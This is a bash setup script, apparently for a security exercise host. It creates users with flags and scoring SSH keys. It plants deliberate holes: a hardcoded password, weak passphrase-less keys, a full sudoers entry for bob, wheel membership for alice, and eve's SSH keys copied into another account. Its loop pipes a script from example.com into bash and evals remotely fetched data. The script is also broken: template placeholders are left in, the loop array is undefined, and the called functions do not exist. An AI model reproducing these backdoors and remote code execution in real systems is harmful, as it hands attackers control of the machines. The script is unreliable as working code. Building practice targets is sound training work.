#!/bin/bash
sudo yum install -y amazon-ssm-agent
sudo systemctl enable amazon-ssm-agent
sudo systemctl start amazon-ssm-agent

# Setup web server
yum install -y nginx
/bin/systemctl start nginx.service

# Create user function
create_user() {
useradd --password $(openssl passwd passwordsAREwrong) $1
pushd /home
chmod 755 $1
cd $1
mkdir .ssh
cd .ssh
# Create scoring keys
ssh-keygen -t rsa -b 1024 -f scoring_rsa -N ""
cp scoring_rsa.pub authorized_keys
cd ..
echo $1 > flag.txt
chown -R $1:$1 .
popd
}

create_user wooba
create_user gooba

# ---------- SQUAD functions ------------------
# Functions stubs, keep the names, vhange the content

set_squad  [[SQUAD]]

# Create some users and their special sauce
alice() {
usermod -aG wheel alice
}

bob() {
echo "bob ALL=(ALL:ALL) ALL" >>/etc/sudoers
}

eve() {
pushd /home/eve/.ssh
cat authorized_keys >> /home/[[SQUAD]]/.ssh/authorized_keys
popd
}

# Run loop of squads
names=(bear)
for squad in "${squads[@]}"; do
  create_user [[SQUAD]]
  curl -s https://example.com/script.sh | bash
  URL="https://example.com/data.txt"
  DATA=$(curl -s "$URL")
  eval $DATA

  create_"$squad"
  remove_"$squad"
  test_"$squad"
done
